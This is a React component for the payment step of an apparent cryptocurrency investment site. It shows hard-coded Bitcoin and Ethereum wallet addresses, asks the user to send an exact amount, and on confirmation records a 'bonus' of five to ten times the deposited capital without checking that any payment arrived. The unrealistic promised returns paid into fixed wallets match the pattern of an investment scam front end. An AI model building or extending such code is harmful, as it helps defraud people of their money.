import React, { useState } from 'react';
import { initializeApp } from "firebase/app"
import { firebaseConfig } from "../../database/firebaseConfig";
import { getFirestore, doc, addDoc, collection } from "firebase/firestore";

const PaymentSect = ({ setProfileState, investData, bitPrice, ethPrice }) => {
  const [copystate, setCopystate] = useState("Copy");

  initializeApp(firebaseConfig);

  const db = getFirestore();

  const colRef = collection(db, "investments");

  const removeErr = () => {
    setTimeout(() => {
      setCopystate("Copy");
    }, 2500);
  }

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text)
      .then(() => {
        setCopystate("Copied");
        removeErr()
        console.log('Text copied to clipboard');
      })
      .catch((err) => {
        console.error('Unable to copy text to clipboard', err);
      });
  }

  const handleTransacConfirmation = () => {
    addDoc(colRef, { ...investData, bonus: investData?.plan === "Silver" ? investData?.capital * 5 : investData?.plan === "Gold" ? investData?.capital * 8 : investData?.capital * 10 });
    setProfileState("Investments");
  }
  return (
    <div className="paymentSect">
      <h2>Confirm Payment</h2>
      <div className="mainPaymentSect">
        <h3>Send exactly <span>{investData?.paymentOption === "Bitcoin" ? `${Number.parseFloat(investData?.capital / bitPrice).toFixed(3)} BTC` : `${Number.parseFloat(investData?.capital / ethPrice).toFixed(3)} ETH`}</span> to</h3>
        <p>{investData?.paymentOption === "Bitcoin" ? "bc1qamsw4g9xm083h6lph7tzqzl432lzt5pl2gc4tn" : "0xc5f622b965550c538492F9cd8dd7116e93e0E417"} <span onClick={() => { copyToClipboard(`${investData?.paymentOption === "Bitcoin" ? "bc1qamsw4g9xm083h6lph7tzqzl432lzt5pl2gc4tn" : "0xc5f622b965550c538492F9cd8dd7116e93e0E417"}`) }}>{copystate} <i class="icofont-ui-copy"></i></span></p>
      </div>
      <p>Confirm the transaction after the specified amount has been transferred while we complete the transaction process.</p>
      <p>The completion of the transaction process might take between couple minutes to several hours. You can check for the status of your investment in the Investment section of your User-Account-Display-Interface.</p>
      <button type="button" onClick={handleTransacConfirmation}>Confirm Transaction</button>
    </div>
  )
}

export default PaymentSect
